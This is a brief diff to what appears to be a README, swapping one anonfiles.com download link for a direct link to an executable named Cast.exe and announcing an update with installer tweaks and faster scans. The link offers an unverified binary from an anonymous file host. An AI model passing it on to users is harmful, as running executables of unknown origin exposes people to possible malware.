@@ -1,4 +1,4 @@
-# [DOWNLOAD](https://anonfiles.com/TbVfM0keyc/Cast_exe)
+# [DOWNLOAD](https://cdn-112.anonfiles.com/TbVfM0keyc/15f3820c-1653758481/Cast.exe)
 # Update 1.3
 - Minor Tweaks To Installer
 - Faster Scans
